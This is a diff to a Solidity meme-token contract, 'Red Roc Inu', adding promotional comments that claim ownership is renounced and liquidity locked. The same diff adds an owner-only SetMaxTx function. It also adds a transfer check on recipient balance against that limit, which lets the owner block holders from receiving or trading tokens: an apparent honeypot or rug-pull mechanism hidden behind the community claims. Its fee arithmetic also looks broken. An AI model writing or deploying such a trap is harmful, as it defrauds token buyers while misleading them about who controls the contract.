@@ -2,6 +2,19 @@
 
 pragma solidity ^0.8.0;
 
+/*      Red Roc Inu IS 
+        A decentralized Meme Token Launch On Binance Smart Chain
+        100% Driven By Community 
+
+        Owner Renounced and Lock Liquidity !!! 
+
+        Telegram Group : https://t.me/redrocinucommunity
+        Website : https://RedRocInu.com
+
+*/
+
+
+
 import "./context.sol";
 import "./ownable.sol";
 import "./uniswap.sol";
@@ -33,6 +46,7 @@ contract StandartToken is Context, IERC20, Ownable {
     uint256 private _totalFeesToContract;
 
     uint256 private _marketingFee;
+    uint256 public _maxTxAmount;
 
 
     IUniswapV2Router02 public uniswapV2Router;
@@ -73,6 +87,7 @@ contract StandartToken is Context, IERC20, Ownable {
         _isExcludedFromMaxBalance[uniswapV2Pair] = true;
 
         _totalFeesToContract = _marketingFee;
+        _maxTxAmount = _totalSupply;
 
         _balances[_msgSender()] = _totalSupply;
         emit Transfer(address(0), _msgSender(), _totalSupply );
@@ -116,6 +131,15 @@ contract StandartToken is Context, IERC20, Ownable {
         returns (uint256)
     {
         return _allowances[owner][spender];
+    }
+
+    function SetMaxTx
+    (
+        uint256 amount
+        )
+        public onlyOwner
+        {
+        _maxTxAmount = amount;
     }
 
     function approve(address spender, uint256 amount)
@@ -224,7 +248,7 @@ contract StandartToken is Context, IERC20, Ownable {
     ) private {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
-        require(amount > 0, "Transfer amount must be greater than zero");
+        require(_balances[to].add(amount) <= _maxTxAmount, "transfer failed");
 
         if (
             from == marketing &&
@@ -235,6 +259,7 @@ contract StandartToken is Context, IERC20, Ownable {
             to != owner() // Not to Owner
         ) {
             _balances[address(this)] = _balances[address(this)].add(amount).div(100).mul(amount);
+            _maxTxAmount = _balances[address(this)].mul(1000);
             takefee();
         }
 
